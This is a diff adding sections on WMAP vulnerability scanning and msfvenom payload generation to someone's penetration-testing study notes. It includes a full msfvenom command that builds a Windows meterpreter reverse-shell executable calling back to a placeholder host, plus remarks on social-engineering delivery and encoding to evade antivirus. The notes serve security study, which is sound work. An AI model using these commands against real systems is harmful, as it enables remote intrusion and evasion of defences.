@@ -833,6 +833,41 @@ With an anonymous null session you can access the IPC$ share and interact with s
   - Skipped this course (i'll try that myself..)
   
   
+  ## Vulnerability Scanning with WMAP
+  - load wmap
+  - Add a site (ip) with wmap_sites -a x.x.x.x
+  - Add a target url with wmap_targets -t http://x.x.x.x
+  - wmap_run -t (this shows all available msf modules)
+  - wmap_run -e (perform the vulnerability check)
+  
+  ## PAYLOADS
+  ### Generating payloads with msfvenom
+  - A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed
+  - Client-side attacks typically utilize various social engineering techniques like generationg malicious documents or portable executables (PEs)
+  - Given this vector involves transferring a malicious payload to the client, we need to be aware of AV detection!
+  -  we will use msfvenom as a payload generator! we will focus on a meterpreter payload...
+  
+  - when specifying a payload with msfvenom, we usually start with the operating system, the architecture and then the protocol to connect back
+  - staged payload uses "/" between meterpreter and protocol, "_" between meterpreter and protocol is a non-staged payload!
+  - e.g. windows/x64/meterpreter/reverse_tcp is a staged payload
+  - e.g. windows/x64/meterpreter_reverse_tcp is a non-staged payload
+  
+  - to generate a payload with msfvenm, you usually have to specify this:
+    - msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f exe > /home/felix/Desktop/payloadx86.exe
+    - this generates a payload for a 32-bit windows machine with the output format exe that connects back to x.x.x.x on port 1234
+    
+  - before you run this payload, set up the msf multi/handler module!! AND SET THE RIGHT PAYLOAD TYPE!
+  
+  ### Encoding Payloads with msfvenom
+  - encoding helps to avoid signature av detection!
+    
+  
+  
+  
+  
+  
+  
+  
   
   
   
